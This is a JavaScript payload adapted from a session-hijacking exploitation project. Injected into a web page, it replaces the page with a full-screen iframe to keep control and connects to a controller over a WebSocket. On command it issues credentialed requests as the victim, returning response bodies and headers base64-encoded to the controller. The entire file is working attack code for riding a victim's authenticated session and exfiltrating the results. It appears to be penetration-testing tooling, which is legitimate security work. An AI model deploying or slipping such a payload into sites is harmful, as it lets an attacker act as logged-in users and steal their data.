// This JS file is a copy of the one on this project : https://github.com/doyensec/Session-Hijacking-Visual-Exploitation/blob/master/server/public/client.js
// A few adjustments has been made in order  to work with almost every type of requests

let listening = "off";
let lastSent = 0;
let storedDOM;
const MAX_MESSAGES_PER_SECOND = 30;

unsafeHeaders = ["accept-charset","accept-encoding","access-control-request-headers","access-control-request-method","connection","content-length","cookie","cookie2","date","dnt","expect","host","keep-alive","origin","referer","set-cookie","te","trailer","transfer-encoding","upgrade","via","x-http-method","x-http-method-override","x-method-override", "user-agent"]

function isSafeHeader(header) {
	if (["sec-","proxy-"].includes(header.slice(0,4).toLowerCase())) {
		return false
	}
	if (unsafeHeaders.includes(header.toLowerCase())) {
		return false
	}
	return true
}

function getPathTo(element) {
  if (element.id!=='')
    return 'id("'+element.id+'")';
  if (element===document.body)
    return element.tagName;

  let ix= 0;
  const siblings= element.parentNode.childNodes;
  for (let i= 0; i<siblings.length; i++) {
    const sibling= siblings[i];
    if (sibling===element)
      return getPathTo(element.parentNode)+'/'+element.tagName+'['+(ix+1)+']';
    if (sibling.nodeType===1 && sibling.tagName===element.tagName)
      ix++;
  }
}


function getPersistence() {
  return new Promise((resolve) => {
    document.documentElement.innerHTML = '';
    const iframe = document.createElement('iframe');
    iframe.src = window.location.href;
    iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;z-index:99999';
    document.documentElement.appendChild(iframe);

    iframe.addEventListener('load', () => {
      resolve(iframe);
    });

  });
}


function checkSameOrigin(url) {
  const locationOrigin = new URL(window.location.href);
  console.log(url)
  const urlOrigin = new URL(url);

  if (locationOrigin.protocol !== urlOrigin.protocol || locationOrigin.hostname !== urlOrigin.hostname || locationOrigin.port !== urlOrigin.port) {
    return false;
  }

  const locationDomainParts = locationOrigin.hostname.split('.').reverse();
  const urlDomainParts = urlOrigin.hostname.split('.').reverse();

  for (let i = 0; i < Math.min(locationDomainParts.length, urlDomainParts.length); i++) {
    if (locationDomainParts[i] !== urlDomainParts[i]) {
      return false;
    }
  }

  return true;
}

async function checkCorsHeaders(url, headers) {
  try {
    const response = await fetch(url, {
      method: 'OPTIONS',
      mode: 'cors',
      headers: {
        'Access-Control-Request-Method': 'GET',
        'Access-Control-Request-Headers': headers.join(','),
      },
    });

    if (response.ok) {
      const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
      return {
        allowedOrigin: allowedOrigin === window.location.origin,
        allowedHeaders: allowedHeaders ? allowedHeaders.split(',').map((header) => header.trim().toLowerCase()) : [],
      };
    }
  } catch (error) {
    console.error('Error sending preflight request:', error);
  }

  return { allowedOrigin: false, allowedHeaders: [] };
}

async function sendHttpRequest(data, ws) {
  const sameOrigin = checkSameOrigin(data.url);
  let allowedOrigin = false;
  let allowedHeaders = [];

  if (!sameOrigin) {
    const corsHeaders = await checkCorsHeaders(data.url, Object.keys(data.headers || {}));
    allowedOrigin = corsHeaders.allowedOrigin;
    allowedHeaders = corsHeaders.allowedHeaders;
  }

  if (sameOrigin || allowedOrigin) {
    const xhr = new XMLHttpRequest();
    xhr.responseType = "arraybuffer";

    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        let responseData;
        // responseData = xhr.responseText;
        resp = new Uint8Array(xhr.response)
        responseData = ""
        for (let i=0; i<resp.length;i++) {
          responseData += String.fromCharCode(resp[i])
      }
        const responseHeaders = {};
        xhr.getAllResponseHeaders().split('\r\n').forEach((header) => {
          const [key, value] = header.split(': ');
          if (key) {
            responseHeaders[key] = value;
          }
        });
        ws.send(JSON.stringify({
          id_request: data.id_request,
          data: btoa(responseData),
          headers: responseHeaders,
          status_code: xhr.status,
        }));
      }
    };
    xhr.onerror = () => {
      ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0 , id_request: data.id_request}));
    };
    xhr.open(data.method, data.url);
    xhr.withCredentials = true;

    if (!sameOrigin) {
      Object.entries(data.headers || {}).forEach(([header, value]) => {
        if (allowedHeaders.includes(header.toLowerCase()) && isSafeHeader(header)) {
		  xhr.setRequestHeader(header, value);
        }
      });
    } else{
      Object.entries(data.headers || {}).forEach(([header, value]) => {
		  if (isSafeHeader(header)) {
			  xhr.setRequestHeader(header, value);
		  }
      });
    }
    if (data.method === 'POST' || data.method === 'PUT') {
	  body = atob(data.data);
	  binaryData = new Uint8Array(body.length);
	  for (let i=0; i<body.length; i++){
		  binaryData[i] = body.charCodeAt(i);
	  }
      xhr.send(binaryData);
    } else {
      xhr.send();
    }
  } else {
    ws.send(JSON.stringify({ error: 'Invalid Security Context', statusCode: 0, id_request: data.id_request }));
  }
}

let ws = null;

if (window.parent === window) {
  ws = new WebSocket('ws://localhost:8888');
  getPersistence().then((iframe) => {
    ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      if (message.sendRequest) {
        console.log("Sending HTTP request")
        sendHttpRequest(message, ws);
      }
    };
  });
}
